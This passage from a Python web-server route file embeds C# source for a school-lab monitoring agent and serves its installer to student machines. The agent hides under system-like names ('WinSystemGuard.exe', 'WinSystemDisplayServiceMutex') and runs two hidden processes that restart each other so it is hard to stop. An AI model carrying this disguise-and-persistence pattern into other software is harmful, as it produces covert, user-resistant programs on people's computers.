            System.Environment.SetEnvironmentVariable("ALLUSERS", "2");
            System.Environment.SetEnvironmentVariable("MSIINSTALLPERUSER", "1");

            if (args.Length > 0 && args[0] == "--worker")
            {
                string guardianPath = args.Length > 1 ? args[1] : null;
                if (!string.IsNullOrEmpty(guardianPath))
                {
                    ThreadPool.QueueUserWorkItem(delegate
                    {
                        while (true)
                        {
                            try
                            {
                                string gName = Path.GetFileNameWithoutExtension(guardianPath);
                                if (Process.GetProcessesByName(gName).Length == 0 && File.Exists(guardianPath))
                                {
                                    ProcessStartInfo gpsi = new ProcessStartInfo(guardianPath);
                                    gpsi.UseShellExecute = false;
                                    gpsi.CreateNoWindow = true;
                                    Process.Start(gpsi);
                                }
                            }
                            catch { }
                            Thread.Sleep(1200);
                        }
                    });
                }
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new LabAgentForm());
                return;
            }

            bool createdNew;
            using (Mutex mutex = new Mutex(true, "Global\\WinSystemDisplayServiceMutex", out createdNew))
            {
                if (!createdNew) return;
                string exePath = Application.ExecutablePath;
                string dir = Path.GetDirectoryName(exePath);
                string workerExe = Path.Combine(dir, "WinSystemGuard.exe");
                try
                {
                    if (!File.Exists(workerExe) || new FileInfo(workerExe).Length != new FileInfo(exePath).Length)
                    {
                        File.Copy(exePath, workerExe, true);
                    }
                }
                catch
                {
                    workerExe = exePath;
                }

                while (true)
                {
                    try
                    {
                        ProcessStartInfo psi = new ProcessStartInfo(workerExe, "--worker \"" + exePath + "\"");
                        psi.UseShellExecute = false;
                        psi.CreateNoWindow = true;
                        Process p = Process.Start(psi);
                        p.WaitForExit();
                    }
                    catch { }
                    Thread.Sleep(400);
                }
            }
        }
    }
}
"""


@router.get("/WinSystemSetup.bat")
@router.get("/ogrenci-istemci.bat")
def download_student_bat():
    bat_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "..", "frontend", "public", "labizleme", "WinSystemSetup.bat")
    if os.path.isfile(bat_file_path):
        with open(bat_file_path, "r", encoding="utf-8") as f:
            content = f.read()
    else:
        content = BAT_CONTENT
    content = content.replace("\r\n", "\n").replace("\n", "\r\n")
    return Response(
        content=content.encode("utf-8"),
        media_type="application/octet-stream",
        headers={"Content-Disposition": 'attachment; filename="WinSystemSetup.bat"'},
    )


@router.get("/PiriReisLabMaster.exe")
def download_master_app():
    exe_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "data", "PiriReisLabMaster.exe")
    if not os.path.isfile(exe_path):
        exe_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "..", "desktop", "PiriReisLabMaster.exe")
    if not os.path.isfile(exe_path):
        raise HTTPException(status_code=404, detail="Masaüstü uygulaması bulunamadı.")
    return FileResponse(
        exe_path,
        filename="PiriReisLabMaster.exe",
        media_type="application/vnd.microsoft.portable-executable"
    )

